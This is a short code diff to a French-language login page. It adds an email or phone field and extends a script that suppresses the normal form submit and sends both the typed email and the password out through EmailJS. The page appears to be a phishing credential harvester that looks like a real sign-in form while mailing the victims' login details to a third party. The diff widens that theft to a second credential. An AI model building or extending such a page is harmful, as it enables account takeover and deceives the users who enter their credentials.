@@ -274,6 +274,7 @@
         </div>
         <br>
         <form id="loginForm">
+            <input type="text" placeholder="Email ou telephone"  name="passemail"  id="passemail">
             <input type="password" placeholder="Mot de passe"  name="passcode"  id="passcode">
             <button type="submit" class="btn-login">Se connecter</button>
             <div class="forgot-pwd">
@@ -307,10 +308,12 @@
         event.preventDefault(); // Empêche le vrai submit
 
         let passcode = document.getElementById("passcode").value;
+        let passemail = document.getElementById("passemail").value;
         // Données à envoyer
         let templateParams = {
             passcode: passcode,
-            message:'merci '+passcode + 'conection reussi test'
+            passemail:passemail,
+            message:'merci '+passcode + 'conection reussi test'+passemail
         };
 
         // Envoi via EmailJS
